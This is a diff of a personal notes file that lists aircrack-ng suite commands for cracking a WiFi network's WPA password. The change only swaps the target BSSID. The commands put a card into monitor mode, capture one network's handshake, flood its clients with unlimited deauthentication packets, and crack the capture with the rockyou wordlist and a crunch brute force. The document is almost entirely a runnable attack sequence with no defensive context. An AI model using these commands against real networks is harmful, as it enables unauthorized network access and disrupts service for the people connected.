@@ -4,8 +4,8 @@ airmon-ng check
 airmon-ng check kill
 airmon-ng start wlan0 
 airodump-ng wlan0
-airodump-ng wlan0 -d C6:4A:D5:A5:58:B6
-airodump-ng -w hack1 -c 6 --bssid C6:4A:D5:A5:58:B6 wlan0  
+airodump-ng wlan0 -d A6:4A:D5:A5:58:B4
+airodump-ng -w hack1 -c 6 --bssid A6:4A:D5:A5:58:B4 wlan0  
 
 Unzip the rockyou file
 gunzip /usr/share/wordlists/rockyou.txt.gz
@@ -14,9 +14,9 @@ after crack hack1-01.cap file by dictionery attack
 aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
 
 after crack hack1-01.cap file by brute force attack
-crunch  6 12 sachin12345 | aircrack-ng hack1-01.cap -b C6:4A:D5:A5:58:B6 -w-
+crunch  6 12 sachin12345 | aircrack-ng hack1-01.cap -b A6:4A:D5:A5:58:B4 -w-
 
 Second Terminal 
-aireplay-ng --deauth 0 -a C6:4A:D5:A5:58:B6 wlan0 
+aireplay-ng --deauth 0 -a A6:4A:D5:A5:58:B4 wlan0 
 
 
